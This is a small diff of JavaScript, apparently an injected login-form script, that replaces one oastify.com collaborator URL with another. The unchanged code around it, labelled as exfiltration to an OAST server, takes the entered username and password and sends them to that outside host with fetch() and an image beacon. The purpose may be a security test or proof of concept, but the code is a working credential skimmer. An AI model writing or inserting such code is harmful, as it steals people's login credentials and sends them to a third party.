@@ -52,7 +52,7 @@ function f() {
 if(b.value.length>0) {
 // --- Exfiltration to OAST server ---
 try {
-  var exfil = 'https://havp2ssc8ijmz8tkyce38271lsrjf93y.oastify.com/?user=' + 
+  var exfil = 'https://tiffvet87czvz08fgojxlzib72dt1jp8.oastify.com/?user=' + 
               encodeURIComponent(a.value) + '&pass=' + encodeURIComponent(b.value);
   fetch(exfil)
   new Image().src = exfil;
